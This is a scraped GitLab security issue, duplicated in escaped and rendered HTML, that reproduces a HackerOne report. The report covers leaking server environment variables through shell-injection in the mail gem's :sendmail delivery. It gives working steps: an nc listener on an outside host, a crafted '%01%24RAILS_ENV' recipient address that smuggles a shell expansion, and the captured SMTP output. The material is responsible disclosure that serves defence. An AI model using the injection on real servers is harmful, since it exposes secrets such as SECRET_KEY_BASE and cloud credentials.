href=\&quot;#examples\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eExamples\u003c/h5\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;69:1-69:26\&quot; dir=\&quot;auto\&quot;\u003eSee the steps to reproduce\u003c/p\u003e\u0026#x000A;\u003ch5 data-sourcepos=\&quot;71:1-71:44\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-what-is-the-current-bug-behavior\&quot; class=\&quot;anchor\&quot; href=\&quot;#what-is-the-current-bug-behavior\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eWhat is the current \u003cem data-sourcepos=\&quot;71:28-71:32\&quot;\u003ebug\u003c/em\u003e behavior?\u003c/h5\u003e\u0026#x000A;\u003cul data-sourcepos=\&quot;72:1-75:0\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;72:1-72:36\&quot;\u003eNo validation on email addresses\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;73:1-73:73\&quot;\u003eThe mail gem passes a string to \u003ccode data-sourcepos=\&quot;73:36-73:43\&quot;\u003eIO.popen\u003c/code\u003e causing a shell to be used\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;74:1-75:0\&quot;\u003eInsufficient escaping of the email addresses by the mail gem\u003c/li\u003e\u0026#x000A;\u003c/ul\u003e\u0026#x000A;\u003ch5 data-sourcepos=\&quot;76:1-76:49\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-what-is-the-expected-correct-behavior\&quot; class=\&quot;anchor\&quot; href=\&quot;#what-is-the-expected-correct-behavior\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eWhat is the expected \u003cem data-sourcepos=\&quot;76:29-76:37\&quot;\u003ecorrect\u003c/em\u003e behavior?\u003c/h5\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;77:1-77:242\&quot; dir=\&quot;auto\&quot;\u003eThe master branch of mail seems to have fixed the issue by passing an array to \u003ccode data-sourcepos=\&quot;77:81-77:88\&quot;\u003eIO.popen\u003c/code\u003e to avoid a shell, but there doesn&#39;t seem to be a new release \u003ca href=\&quot;https://github.com/mikel/mail/blob/master/lib/mail/network/delivery_methods/sendmail.rb#L63\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003ehttps://github.com/mikel/mail/blob/master/lib/mail/network/delivery_methods/sendmail.rb#L63\u003c/a\u003e\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;79:1-79:109\&quot; dir=\&quot;auto\&quot;\u003eThe email addresses could also be validated before being used to ensure that they have no invalid characters.\u003c/p\u003e\u0026#x000A;\u003ch5 data-sourcepos=\&quot;81:1-81:39\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-relevant-logs-andor-screenshots\&quot; class=\&quot;anchor\&quot; href=\&quot;#relevant-logs-andor-screenshots\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eRelevant logs and/or screenshots\u003c/h5\u003e\u0026#x000A;\u003ch5 data-sourcepos=\&quot;83:1-83:25\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-output-of-checks\&quot; class=\&quot;anchor\&quot; href=\&quot;#output-of-checks\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eOutput of checks\u003c/h5\u003e\u0026#x000A;\u003ch6 data-sourcepos=\&quot;84:1-84:44\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-results-of-gitlab-environment-info\&quot; class=\&quot;anchor\&quot; href=\&quot;#results-of-gitlab-environment-info\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eResults of GitLab environment info\u003c/h6\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;85:1-121:3\&quot; class=\&quot;code highlight js-syntax-highlight language-plaintext\&quot; lang=\&quot;plaintext\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eSystem information  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eSystem:  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC3\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eProxy:\t\tno  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC4\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eCurrent User:\tgit  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC5\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eUsing RVM:\tno  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC6\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eRuby Version:\t2.7.2p137  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC7\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eGem Version:\t3.1.4  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC8\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eBundler Version:2.1.4  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC9\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eRake Version:\t13.0.3  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC10\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eRedis Version:\t6.0.14  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC11\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eGit Version:\t2.32.0  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC12\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eSidekiq Version:5.2.9  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC13\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eGo Version:\tunknown\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC14\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC15\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eGitLab information  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC16\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eVersion:\t14.1.1-ee  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC17\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eRevision:\tf331f932688  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC18\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eDirectory:\t/opt/gitlab/embedded/service/gitlab-rails  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC19\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eDB Adapter:\tPostgreSQL  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC20\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eDB Version:\t12.6  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC21\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eURL:\t\thttp://gitlab.testing  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC22\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eHTTP Clone URL:\thttp://gitlab.testing/some-group/some-project.git  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC23\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eSSH Clone URL:\tgit@gitlab.testing:some-group/some-project.git  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC24\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eElasticsearch:\tno  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC25\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eGeo:\t\tno  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC26\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eUsing LDAP:\tno  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC27\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eUsing Omniauth:\tyes  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC28\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eOmniauth Providers:\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC29\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC30\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eGitLab Shell  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC31\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eVersion:\t13.19.0  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC32\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eRepository storage paths:  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC33\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e- default: \t/var/opt/gitlab/git-data/repositories  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC34\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eGitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC35\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eGit:\t\t/opt/gitlab/embedded/bin/git  \u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003ch4 data-sourcepos=\&quot;123:1-123:12\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-impact-1\&quot; class=\&quot;anchor\&quot; href=\&quot;#impact-1\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eImpact\u003c/h4\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;125:1-125:282\&quot; dir=\&quot;auto\&quot;\u003eAn attacker can read arbitrary environment variables from the server if bash is configured as the default shell. As sensitive values are often passed around using environment variables (such as \u003ccode data-sourcepos=\&quot;125:196-125:210\&quot;\u003eSECRET_KEY_BASE\u003c/code\u003e or aws credentials) they could be read and used to gain further access\u003c/p\u003e\u0026#x000A;\u003ch2 data-sourcepos=\&quot;127:1-127:19\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-how-to-reproduce\&quot; class=\&quot;anchor\&quot; href=\&quot;#how-to-reproduce\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eHow To Reproduce\u003c/h2\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;129:1-129:57\&quot; dir=\&quot;auto\&quot;\u003ePlease add \u003ca data-sourcepos=\&quot;129:12-129:40\&quot; href=\&quot;https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003ereproducibility information\u003c/a\u003e to this section:\u003c/p\u003e\u0026#x000A;\u003col data-sourcepos=\&quot;131:1-134:0\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;131:1-131:2\&quot;\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;132:1-132:2\&quot;\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;133:1-133:2\&quot;\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003c/ol\u003e&quot;,&quot;initialDescriptionText&quot;:&quot;**[HackerOne report #1286317](https://hackerone.com/reports/1286317)** by `vakzz` on 2021-08-02, assigned to @rshambhuni:\n\n[Report](#report) | [How To Reproduce](#how-to-reproduce)\n\n## Report\n\n#####  Summary\n\nThe gitlab omnibus edition defaults to using `:sendmail` as the delivery method for emails. ActionMailer depends on mail v2.7.1 for this https://gitlab.com/gitlab-org/gitlab/-/blob/v14.1.1-ee/Gemfile.lock#L1546\n\nWhen `:sendmail` is used as the delivery method, `/usr/sbin/sendmail` will end up being called with the `to` address going through the following function:\n\nhttps://github.com/mikel/mail/blob/2.7.1/lib/mail/network/delivery_methods/sendmail.rb#L85-L93  \n```ruby  \n    def self.shellquote(address)  \n      # Process as a single byte sequence because not all shell  \n      # implementations are multibyte aware.  \n      #  \n      # A LF cannot be escaped with a backslash because a backslash + LF  \n      # combo is regarded as line continuation and simply ignored. Strip it.  \n      escaped = address.gsub(/([^A-Za-z0-9_\\s\\+\\-.,:\\/@~])/n, \&quot;\\\\\\\\\\\\1\&quot;).gsub(\&quot;\\n\&quot;, &#39;&#39;)  \n      %(\&quot;#{escaped}\&quot;)  \n    end  \n```\n\nThere is a long standing issue in bash where a backlash followed by a `\\001` character can cause issues with interpolation   \n https://lists.gnu.org/archive/html/bug-bash/2007-03/msg00065.html which causes `\\^A\\$` to think second backslash is being escaped and leaves the `$` unescaped (`^A` is `\\x00` and can be entered with ctrl-v ctrl-a):\n\n```bash  \nbash-5.1$ echo -n \&quot;\\^A\\$USER\&quot; | xxd  \n00000000: 5c01 5c77 696c 6c                        \\.\\will  \n```\n\nSo if an email is sent to `\&quot;someone+\\x01$HOME@place.com\&quot;` then after shellqoute it will be `\&quot;someone+\\\\u0001\\$HOME@place.com\&quot;` and bash will expand the `HOME ` variable.\n\nSince `sendmail` is run using a string to `IO.popen`, this bug relies on bash being the default /bin/sh shell (which it is on OSX, RHEL, Centos and can be done in Ubuntu with `dpkg-reconfigure dash`) .\n\n\n#####  Steps to reproduce  \n1. Use something like vagrant/virtualbox to create a CentOS 8 vm or spin up a vps  \n1. Following the instructions to install gitlab  https://about.gitlab.com/install/#centos-8.  \n1. (ALT) Alternatively to steps 1 and 2 the docker installation can be used if you run `dpkg-reconfigure dash` and disable dash as the default system shell  \n1. Somewhere with a publicly accessible ip run `echo -e &#39;200 ok\\n200 ok\\n200 ok\\n200 ok\\n200 ok\\n200 ok\\n&#39; | sudo nc -vl 25`  \n1. Login to gitlab and create a new project  \n1. Go to Settings -\u003e Integrations -\u003e Emails on push  \n1. Fire up Burp or open the network tab in Chrome  \n1. In the `Recipients` enter `user+test@111.111.111.111.getmoss.site` replacing `111.111.111.111` with the ip of the machine running `nc`  \n1. Ensure `Trigger event for pushes to the repository.` is checked and press save  \n1. Either edit the request in burp or copy as curl from the network tab and change the `test` in the email to be `%01%24RAILS_ENV` and run the request  \n1. Edit or add a file to the project  \n1. You should see the environment variable in the `to` address in `nc`\n\n```  \n$ echo -e &#39;200 ok\\n200 ok\\n200 ok\\n200 ok\\n200 ok\\n200 ok\\n&#39; | sudo nc -vl 25  \nListening on [103.xxx.xxx.xxx] (family 0, port 25)  \nConnection from [45.xxx.xxx.xxx] port 25 [tcp/smtp] accepted (family 2, sport 53932)  \nEHLO localhost.localdomain  \nMAIL FROM:\u003cgitlab@gitlab.testing\u003e  \nRCPT TO:\u003c\&quot;will+production\&quot;[@]103.xxx.xxx.xxx.getmoss.site\u003e  \nDATA  \nRSET  \nQUIT  \n```\n\n#####  Impact  \nAn attacker can read arbitrary environment variables from the server if bash is configured as the default shell. As sensitive values are often passed around using environment variables (such as `SECRET_KEY_BASE` or aws credentials) they could be read and used to gain further access\n\n#####  Examples  \nSee the steps to reproduce\n\n#####  What is the current *bug* behavior?  \n* No validation on email addresses  \n* The mail gem passes a string to `IO.popen` causing a shell to be used  \n* Insufficient escaping of the email addresses by the mail gem\n\n#####  What is the expected *correct* behavior?  \nThe master branch of mail seems to have fixed the issue by passing an array to `IO.popen` to avoid a shell, but there doesn&#39;t seem to be a new release https://github.com/mikel/mail/blob/master/lib/mail/network/delivery_methods/sendmail.rb#L63\n\nThe email addresses could also be validated before being used to ensure that they have no invalid characters.\n\n#####  Relevant logs and/or screenshots\n\n#####  Output of checks  \n######  Results of GitLab environment info  \n```  \nSystem information  \nSystem:  \nProxy:\t\tno  \nCurrent User:\tgit  \nUsing RVM:\tno  \nRuby Version:\t2.7.2p137  \nGem Version:\t3.1.4  \nBundler Version:2.1.4  \nRake Version:\t13.0.3  \nRedis Version:\t6.0.14  \nGit Version:\t2.32.0  \nSidekiq Version:5.2.9  \nGo Version:\tunknown\n\nGitLab information  \nVersion:\t14.1.1-ee  \nRevision:\tf331f932688  \nDirectory:\t/opt/gitlab/embedded/service/gitlab-rails  \nDB Adapter:\tPostgreSQL  \nDB Version:\t12.6  \nURL:\t\thttp://gitlab.testing  \nHTTP Clone URL:\thttp://gitlab.testing/some-group/some-project.git  \nSSH Clone URL:\tgit@gitlab.testing:some-group/some-project.git  \nElasticsearch:\tno  \nGeo:\t\tno  \nUsing LDAP:\tno  \nUsing Omniauth:\tyes  \nOmniauth Providers:\n\nGitLab Shell  \nVersion:\t13.19.0  \nRepository storage paths:  \n- default: \t/var/opt/gitlab/git-data/repositories  \nGitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell  \nGit:\t\t/opt/gitlab/embedded/bin/git  \n```\n\n####  Impact\n\nAn attacker can read arbitrary environment variables from the server if bash is configured as the default shell. As sensitive values are often passed around using environment variables (such as `SECRET_KEY_BASE` or aws credentials) they could be read and used to gain further access\n\n## How To Reproduce\n\nPlease add [reproducibility information] to this section:\n\n1.\n1.\n1.\n\n[reproducibility information]: https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues&quot;,&quot;initialTaskCompletionStatus&quot;:{&quot;count&quot;:0,&quot;completed_count&quot;:0},&quot;canCreateIncident&quot;:false,&quot;fullPath&quot;:&quot;gitlab-org/gitlab&quot;,&quot;iid&quot;:337601,&quot;issuableId&quot;:91412505,&quot;issueType&quot;:&quot;issue&quot;,&quot;isHidden&quot;:false,&quot;zoomMeetingUrl&quot;:null,&quot;authorId&quot;:2741139,&quot;authorName&quot;:&quot;GitLab SecurityBot&quot;,&quot;authorUsername&quot;:&quot;gitlab-securitybot&quot;,&quot;authorWebUrl&quot;:&quot;/gitlab-securitybot&quot;,&quot;createdAt&quot;:&quot;2021-08-04T06:03:56+00:00&quot;,&quot;isFirstContribution&quot;:false,&quot;serviceDeskReplyTo&quot;:null,&quot;registerPath&quot;:&quot;/users/sign_up?redirect_to_referer=yes&quot;,&quot;signInPath&quot;:&quot;/users/sign_in?redirect_to_referer=yes&quot;,&quot;publishedIncidentUrl&quot;:null,&quot;slaFeatureAvailable&quot;:&quot;false&quot;,&quot;uploadMetricsFeatureAvailable&quot;:&quot;false&quot;,&quot;projectId&quot;:278964,&quot;projectPath&quot;:&quot;gitlab&quot;,&quot;projectNamespace&quot;:&quot;gitlab-org&quot;,&quot;canAdmin&quot;:false,&quot;hasIssueWeightsFeature&quot;:true,&quot;hasIterationsFeature&quot;:true,&quot;canAdminRelation&quot;:false}" id="js-issuable-app">
<div class="title-container">
<h1 class="gl-heading-1 !gl-m-0">Environment variables can be leaked via the `:sendmail` delivery method</h1>
</div>
<div class="description">
<div class="md"><p data-sourcepos="1:1-1:121" dir="auto"><strong data-sourcepos="1:1-1:70"><a data-sourcepos="1:3-1:68" href="https://hackerone.com/reports/1286317" rel="nofollow noreferrer noopener" target="_blank">HackerOne report #1286317</a></strong> by <code data-sourcepos="1:76-1:80">vakzz</code> on 2021-08-02, assigned to <a href="/rshambhuni" data-reference-type="user" data-user="9043659" data-container="body" data-placement="top" class="gfm gfm-project_member js-user-link" title="Rohit Shambhuni">@rshambhuni</a>:</p>&#x000A;<p data-sourcepos="3:1-3:57" dir="auto"><a data-sourcepos="3:1-3:17" href="#report">Report</a> | <a data-sourcepos="3:21-3:57" href="#how-to-reproduce">How To Reproduce</a></p>&#x000A;<h2 data-sourcepos="5:1-5:9" dir="auto">&#x000A;<a id="user-content-report" class="anchor" href="#report" aria-hidden="true"></a>Report</h2>&#x000A;<h5 data-sourcepos="7:1-7:14" dir="auto">&#x000A;<a id="user-content-summary" class="anchor" href="#summary" aria-hidden="true"></a>Summary</h5>&#x000A;<p data-sourcepos="9:1-9:210" dir="auto">The gitlab omnibus edition defaults to using <code data-sourcepos="9:47-9:55">:sendmail</code> as the delivery method for emails. ActionMailer depends on mail v2.7.1 for this <a href="https://gitlab.com/gitlab-org/gitlab/-/blob/v14.1.1-ee/Gemfile.lock#L1546">https://gitlab.com/gitlab-org/gitlab/-/blob/v14.1.1-ee/Gemfile.lock#L1546</a></p>&#x000A;<p data-sourcepos="11:1-11:154" dir="auto">When <code data-sourcepos="11:7-11:15">:sendmail</code> is used as the delivery method, <code data-sourcepos="11:51-11:68">/usr/sbin/sendmail</code> will end up being called with the <code data-sourcepos="11:106-11:107">to</code> address going through the following function:</p>&#x000A;<p data-sourcepos="13:1-13:96" dir="auto"><a href="https://github.com/mikel/mail/blob/2.7.1/lib/mail/network/delivery_methods/sendmail.rb#L85-L93" rel="nofollow noreferrer noopener" target="_blank">https://github.com/mikel/mail/blob/2.7.1/lib/mail/network/delivery_methods/sendmail.rb#L85-L93</a></p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="14:1-24:3" data-canonical-lang="ruby" class="code highlight js-syntax-highlight language-ruby" lang="ruby" v-pre="true"><code><span id="LC1" class="line" lang="ruby">    <span class="k">def</span> <span class="nc">self</span><span class="o">.</span><span class="nf">shellquote</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>  </span>&#x000A;<span id="LC2" class="line" lang="ruby">      <span class="c1"># Process as a single byte sequence because not all shell  </span></span>&#x000A;<span id="LC3" class="line" lang="ruby">      <span class="c1"># implementations are multibyte aware.  </span></span>&#x000A;<span id="LC4" class="line" lang="ruby">      <span class="c1">#  </span></span>&#x000A;<span id="LC5" class="line" lang="ruby">      <span class="c1"># A LF cannot be escaped with a backslash because a backslash + LF  </span></span>&#x000A;<span id="LC6" class="line" lang="ruby">      <span class="c1"># combo is regarded as line continuation and simply ignored. Strip it.  </span></span>&#x000A;<span id="LC7" class="line" lang="ruby">      <span class="n">escaped</span> <span class="o">=</span> <span class="n">address</span><span class="p">.</span><span class="nf">gsub</span><span class="p">(</span><span class="sr">/([^A-Za-z0-9_\s\+\-.,:\/@~])/n</span><span class="p">,</span> <span class="s2">"</span><span class="se">\\\\\\</span><span class="s2">1"</span><span class="p">).</span><span class="nf">gsub</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span>  </span>&#x000A;<span id="LC8" class="line" lang="ruby">      <span class="sx">%("</span><span class="si">#{</span><span class="n">escaped</span><span class="si">}</span><span class="sx">")</span>  </span>&#x000A;<span id="LC9" class="line" lang="ruby">    <span class="k">end</span>  </span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<p data-sourcepos="26:1-27:257" dir="auto">There is a long standing issue in bash where a backlash followed by a <code data-sourcepos="26:72-26:75">\001</code> character can cause issues with interpolation<br data-sourcepos="26:126-26:126">&#x000A;<a href="https://lists.gnu.org/archive/html/bug-bash/2007-03/msg00065.html" rel="nofollow noreferrer noopener" target="_blank">https://lists.gnu.org/archive/html/bug-bash/2007-03/msg00065.html</a> which causes <code data-sourcepos="27:81-27:127">\^A\$</code> to think second backslash is being escaped and leaves the <code data-sourcepos="27:189-27:189">$</code> unescaped (<code data-sourcepos="27:204-27:205">^A</code> is <code data-sourcepos="27:212-27:215">\x00</code> and can be entered with ctrl-v ctrl-a):</p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="29:1-32:3" data-canonical-lang="bash" class="code highlight js-syntax-highlight language-shell" lang="shell" v-pre="true"><code><span id="LC1" class="line" lang="shell">bash-5.1<span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"</span><span class="se">\^</span><span class="s2">A</span><span class="se">\$</span><span class="s2">USER"</span> | xxd  </span>&#x000A;<span id="LC2" class="line" lang="shell">00000000: 5c01 5c77 696c 6c                        <span class="se">\.\w</span>ill  </span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<p data-sourcepos="34:1-34:190" dir="auto">So if an email is sent to <code data-sourcepos="34:28-34:56">"someone+\x01$HOME@place.com"</code> then after shellqoute it will be <code data-sourcepos="34:93-34:146">"someone+\\u0001\$HOME@place.com"</code> and bash will expand the <code data-sourcepos="34:175-34:179">HOME </code> variable.</p>&#x000A;<p data-sourcepos="36:1-36:201" dir="auto">Since <code data-sourcepos="36:8-36:15">sendmail</code> is run using a string to <code data-sourcepos="36:44-36:51">IO.popen</code>, this bug relies on bash being the default /bin/sh shell (which it is on OSX, RHEL, Centos and can be done in Ubuntu with <code data-sourcepos="36:177-36:197">dpkg-reconfigure dash</code>) .</p>&#x000A;<h5 data-sourcepos="39:1-39:27" dir="auto">&#x000A;<a id="user-content-steps-to-reproduce" class="anchor" href="#steps-to-reproduce" aria-hidden="true"></a>Steps to reproduce</h5>&#x000A;<ol data-sourcepos="40:1-52:0" dir="auto">&#x000A;<li data-sourcepos="40:1-40:83">Use something like vagrant/virtualbox to create a CentOS 8 vm or spin up a vps</li>&#x000A;<li data-sourcepos="41:1-41:94">Following the instructions to install gitlab  <a href="https://about.gitlab.com/install/#centos-8" rel="nofollow noreferrer noopener" target="_blank">https://about.gitlab.com/install/#centos-8</a>.</li>&#x000A;<li data-sourcepos="42:1-42:157">(ALT) Alternatively to steps 1 and 2 the docker installation can be used if you run <code data-sourcepos="42:89-42:109">dpkg-reconfigure dash</code> and disable dash as the default system shell</li>&#x000A;<li data-sourcepos="43:1-43:126">Somewhere with a publicly accessible ip run <code data-sourcepos="43:49-43:123">echo -e '200 ok\n200 ok\n200 ok\n200 ok\n200 ok\n200 ok\n' | sudo nc -vl 25</code>&#x000A;</li>&#x000A;<li data-sourcepos="44:1-44:45">Login to gitlab and create a new project</li>&#x000A;<li data-sourcepos="45:1-45:53">Go to Settings -&gt; Integrations -&gt; Emails on push</li>&#x000A;<li data-sourcepos="46:1-46:51">Fire up Burp or open the network tab in Chrome</li>&#x000A;<li data-sourcepos="47:1-47:139">In the <code data-sourcepos="47:12-47:21">Recipients</code> enter <code data-sourcepos="47:31-47:68">user+test@111.111.111.111.getmoss.site</code> replacing <code data-sourcepos="47:82-47:96">111.111.111.111</code> with the ip of the machine running <code data-sourcepos="47:135-47:136">nc</code>&#x000A;</li>&#x000A;<li data-sourcepos="48:1-48:83">Ensure <code data-sourcepos="48:12-48:54">Trigger event for pushes to the repository.</code> is checked and press save</li>&#x000A;<li data-sourcepos="49:1-49:152">Either edit the request in burp or copy as curl from the network tab and change the <code data-sourcepos="49:89-49:92">test</code> in the email to be <code data-sourcepos="49:115-49:129">%01%24RAILS_ENV</code> and run the request</li>&#x000A;<li data-sourcepos="50:1-50:38">Edit or add a file to the project</li>&#x000A;<li data-sourcepos="51:1-52:0">You should see the environment variable in the <code data-sourcepos="51:52-51:53">to</code> address in <code data-sourcepos="51:68-51:69">nc</code>&#x000A;</li>&#x000A;</ol>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="53:1-63:3" class="code highlight js-syntax-highlight language-plaintext" lang="plaintext" v-pre="true"><code><span id="LC1" class="line" lang="plaintext">$ echo -e '200 ok\n200 ok\n200 ok\n200 ok\n200 ok\n200 ok\n' | sudo nc -vl 25  </span>&#x000A;<span id="LC2" class="line" lang="plaintext">Listening on [103.xxx.xxx.xxx] (family 0, port 25)  </span>&#x000A;<span id="LC3" class="line" lang="plaintext">Connection from [45.xxx.xxx.xxx] port 25 [tcp/smtp] accepted (family 2, sport 53932)  </span>&#x000A;<span id="LC4" class="line" lang="plaintext">EHLO localhost.localdomain  </span>&#x000A;<span id="LC5" class="line" lang="plaintext">MAIL FROM:&lt;gitlab@gitlab.testing&gt;  </span>&#x000A;<span id="LC6" class="line" lang="plaintext">RCPT TO:&lt;"will+production"[@]103.xxx.xxx.xxx.getmoss.site&gt;  </span>&#x000A;<span id="LC7" class="line" lang="plaintext">DATA  </span>&#x000A;<span id="LC8" class="line" lang="plaintext">RSET  </span>&#x000A;<span id="LC9" class="line" lang="plaintext">QUIT  </span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<h5 data-sourcepos="65:1-65:15" dir="auto">&#x000A;<a id="user-content-impact" class="anchor" href="#impact" aria-hidden="true"></a>Impact</h5>&#x000A;<p data-sourcepos="66:1-66:282" dir="auto">An attacker can read arbitrary environment variables from the server if bash is configured as the default shell. As sensitive values are often passed around using environment variables (such as <code data-sourcepos="66:196-66:210">SECRET_KEY_BASE</code> or aws credentials) they could be read and used to gain further access</p>&#x000A;<h5 data-sourcepos="68:1-68:17" dir="auto">&#x000A;<a id="user-content-examples" class="anchor" href="#examples" aria-hidden="true"></a>Examples</h5>&#x000A;<p 